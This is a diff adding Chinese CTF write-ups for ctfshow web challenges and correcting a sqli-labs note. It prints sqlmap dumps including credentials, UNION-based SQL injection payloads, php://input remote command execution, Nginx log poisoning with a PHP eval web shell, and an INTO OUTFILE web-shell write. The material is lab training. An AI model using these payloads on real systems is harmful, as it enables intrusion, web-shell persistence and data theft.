@@ -4616,6 +4616,276 @@ ctfshow{d1cd60d9-6ef5-43de-ae59-a99e56777282} from flask import request cmd: str
 
 ------
 
+### web1
+
+进入靶机后看到一行信息：where is flag?
+
+右键检查网页元素，或`view-source`查看网页源码。
+
+```
+where is flag?
+
+<!-- 
+Y3Rmc2hvd3thNzNjZWM2ZC04YjQyLTQzMTktYWYzZC0xYmQyMjk2Nzk1MzN9-->
+```
+
+直接用PHP命令将注释中字符串`base64`解码即可获得`flag`。
+
+```bash
+C:\Users\tyd>php -r "var_dump(base64_decode('Y3Rmc2hvd3thNzNjZWM2ZC04YjQyLTQzMTktYWYzZC0xYmQyMjk2Nzk1MzN9'));"
+string(45) "ctfshow{a73cec6d-8b42-4319-af3d-1bd229679533}"
+```
+
+提交`ctfshow{a73cec6d-8b42-4319-af3d-1bd229679533}`即可。
+
+------
+
+### web2
+
+靶机直接给出一个登录框，网页源码如下：
+
+```html
+<html lang="zh-CN">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, initial-scale=1.0" />
+    <title>ctf.show_web2</title>
+</head>
+<body>
+    <center>
+    <h2>ctf.show_web2</h2>
+    <hr>
+        <form method="post">
+        用户名:<input type="text" name="username"><br><br>
+        密&nbsp;&nbsp;&nbsp;码:<input type="password" name="password"><br><br>
+        <input type="submit" value="登陆">  
+    </form>
+    </center>
+</body>
+</html>
+```
+
+直接使用`sqlmap`进行爆破求解。
+
+查询所有数据库：
+
+```bash
+sqlmap -u "https://f1ce97b7-b971-47ff-84e8-b5a94939de4c.challenge.ctf.show" --data "username=username&password=password" --dbs
+```
+
+一路按Y，可以在终端中看到以下输出：
+
+```
+[INFO] the back-end DBMS is MySQL
+web application technology: Nginx 1.20.1, PHP 7.3.11
+back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+[INFO] fetching database names
+available databases [6]:
+[*] ctftraining
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] test
+[*] web2
+```
+
+查询指定数据库`web2`中的所有表信息：
+
+```bash
+sqlmap -u "https://f1ce97b7-b971-47ff-84e8-b5a94939de4c.challenge.ctf.show" --data "username=username&password=password" -D web2 --tables
+```
+
+可以在终端中看到以下输出：
+
+```
+[WARNING] reflective value(s) found and filtering out
+Database: web2
+[2 tables]
++------+
+| user |
+| flag |
++------+
+```
+
+查询指定数据库`web2`中指定表`flag`的所有列信息：
+
+```bash
+sqlmap -u "https://f1ce97b7-b971-47ff-84e8-b5a94939de4c.challenge.ctf.show" --data "username=username&password=password" -D web2 -T flag --columns
+```
+
+可以在终端中看到以下输出：
+
+```
+[WARNING] reflective value(s) found and filtering out
+Database: web2
+Table: flag
+[1 column]
++--------+--------------+
+| Column | Type         |
++--------+--------------+
+| flag   | varchar(255) |
++--------+--------------+
+```
+
+查询指定数据库`web2`中指定表`flag`的指定字段`flag`信息：
+
+```bash
+sqlmap -u "https://f1ce97b7-b971-47ff-84e8-b5a94939de4c.challenge.ctf.show" --data "username=username&password=password" -D web2 -T flag -C flag --dump
+```
+
+可以在终端中看到以下输出：
+
+```
+[WARNING] reflective value(s) found and filtering out
+Database: web2
+Table: flag
+[1 entry]
++-----------------------------------------------+
+| flag                                          |
++-----------------------------------------------+
+| ctfshow{fca92377-63b5-4bb3-9f92-d959315f6dc1} |
++-----------------------------------------------+
+```
+
+提交`ctfshow{fca92377-63b5-4bb3-9f92-d959315f6dc1}`即可。
+
+来都来了顺带把账号和密码一块扒啦。
+
+```bash
+$sqlmap -u "https://f1ce97b7-b971-47ff-84e8-b5a94939de4c.challenge.ctf.show" --data "username=username&password=password" -D web2 -T user -C username --dump
++----------+
+| username |
++----------+
+| ctfshow  |
++----------+
+
+$sqlmap -u "https://f1ce97b7-b971-47ff-84e8-b5a94939de4c.challenge.ctf.show" --data "username=username&password=password" -D web2 -T user -C password --dump
++----------+
+| password |
++----------+
+| 6yhnbgt5 |
++----------+
+```
+
+输入账号密码登录进去后，靶机只会显示一行信息：欢迎你，ctfshow。
+
+如果选择手动注入的话，多次尝试后发现是单引号闭合并用#注释，所以`' or 1=1 #`也可以直接登录，并且账号和密码都存在注入点。
+
+判断字段列数，通过`' or 1=1 order by 3#`有回显而改为4没有回显，可知字段数为3。
+
+判断回显位置，使用`' or 1=1 union select 1,2,3#`，通过回显可以推出显示位为2。
+
+获取数据库名称`web2`和数据库版本信息`10.3.18-MariaDB`。
+
+```
+' or 1=1 union select 1,database(),3 #
+
+' or 1=1 union select 1,version(),3 #
+```
+
+查表名，得到回显内容`flag,user`。
+
+```
+' or 1=1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3 #
+```
+
+查列名，得到回显内容`flag`。
+
+```
+' or 1=1 union select 1,(select group_concat(column_name) from information_schema.columns where table_name='flag'),3 #
+```
+
+查字段信息，得到回显内容`ctfshow{fca92377-63b5-4bb3-9f92-d959315f6dc1}`。
+
+```
+' or 1=1 union select 1,(select group_concat(flag) from web2.flag),3 #
+```
+
+提交`ctfshow{fca92377-63b5-4bb3-9f92-d959315f6dc1}`即可。
+
+------
+
+### web3
+
+进入靶机后看到网页内容：
+
+```php+HTML
+ctf.show_web3
+<?php include($_GET['url']);?>
+```
+
+我们可以利用`php://input`伪协议执行PHP代码。
+
+用`Burp Suite`抓包靶机的`/?url=php://input`，添加数据`<?php system("ls"); ?>`，即可在靶机执行`ls`命令，查看当前目录下所有文件。
+
+```
+GET /?url=php://input HTTP/1.1
+Host: 1a82d67f-b116-4685-8936-50d442df7b2f.challenge.ctf.show
+Sec-Ch-Ua: "Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Priority: u=0, i
+Connection: keep-alive
+Content-Length: 23
+
+<?php system("ls");?>
+```
+
+知道当前目录存在`ctf_go_go_go`和`index.php`后，无需再使用`php://input`伪协议读取`flag`信息了。
+
+直接用`/?url=ctf_go_go_go`获取文件内容`ctfshow{c1624ce6-a56b-4852-a313-dfeb83565500}`。
+
+------
+
+### web4
+
+进入靶机后看到网页内容：
+
+```php+HTML
+ctf.show_web4
+<?php include($_GET['url']);?>
+```
+
+ 访问web服务器的日志文件（Nginx日志文件的默认位置是`/var/log/nginx/access.log`）
+
+```
+172.12.0.2 - - [19/Jan/2026:08:04:10 +0000] "GET / HTTP/1.1" 200 715 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36" 172.12.0.2 - - [19/Jan/2026:08:08:55 +0000] "GET /url=/var/log/nginx/access.log HTTP/1.1" 200 715 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36"
+```
+
+使用`BurpSuite`在请求头信息的`User-Agent`中插入PHP木马`<?php @eval($_POST['shell']);?>`。
+
+随后web服务器的日志文件内容会多一条访问记录，但不会显示刚刚插入的一句话木马，因为日志文件中的代码会被执行但不会显示。
+
+用`AntSword`连接靶机，右键启动虚拟终端。
+
+```
+(*) 基础信息
+当前路径: /var/www/html
+磁盘列表: /
+系统信息: Linux 9978efc679b3 5.4.0-163-generic #180-Ubuntu SMP Tue Sep 5 13:21:23 UTC 2023 x86_64
+当前用户: www-data
+(*) 输入 ashelp 查看本地命令
+(www-data:/var/www) $ ls ./
+flag.txt
+html
+localhost
+(www-data:/var/www) $ cat flag.txt
+ctfshow{baf8f06b-e89a-4359-b92e-179e029ea98c}
+```
+
+提交`ctfshow{baf8f06b-e89a-4359-b92e-179e029ea98c}`即可。
+
+------
+
 ## [sqli-labs](https://github.com/Audi-1/sqli-labs)
 
 ### Less-1
@@ -5482,10 +5752,10 @@ Table: users
 
 先来介绍文件操作的函数：`load_file(file_name)`能读取文件并返回该文件的内容作为第一个字符串。使用条件：①必须有读取权限并且文件必须完全可读；②预读取文件必须在服务器上；③必须指定文件的完整路径；④预读取文件必须小于`max_allowed_packet`。
 
-`SELECT ... INTO OUTFILE 'file_name'`可以将被选择的行写入到一个文件中，该文件被创建在服务器主机上，因此必须拥有文件权限才能使用此语法。也就是说我们可以通过`?id=-1')) union select 1,2,3 into outfile "/var/www/sqli-labs/Less7/test.txt" --+`写入数据。此处的第3位可以换成`PHP`的一句话木马`<?php @eval($_POST['shell'])?>`，即改成以下代码：
+`SELECT ... INTO OUTFILE 'file_name'`可以将被选择的行写入到一个文件中，该文件被创建在服务器主机上，因此必须拥有文件权限才能使用此语法。也就是说我们可以通过`?id=-1')) union select 1,2,3 into outfile "/var/www/sqli-labs/Less7/test.txt" --+`写入数据。此处的第3位可以换成`PHP`的一句话木马`<?php @eval($_POST['shell']);?>`，即改成以下代码：
 
 ```sql
-?id=-1')) union select 1,2,<?php @eval($_POST['shell'])?> into outfile "/var/www/sqli-labs/Less7/test.txt" --+
+?id=-1')) union select 1,2,<?php @eval($_POST['shell']);?> into outfile "/var/www/sqli-labs/Less7/test.txt" --+
 ```
 
 `PHP`一句话木马上传成功后，用`AntSword`连接靶机即可。
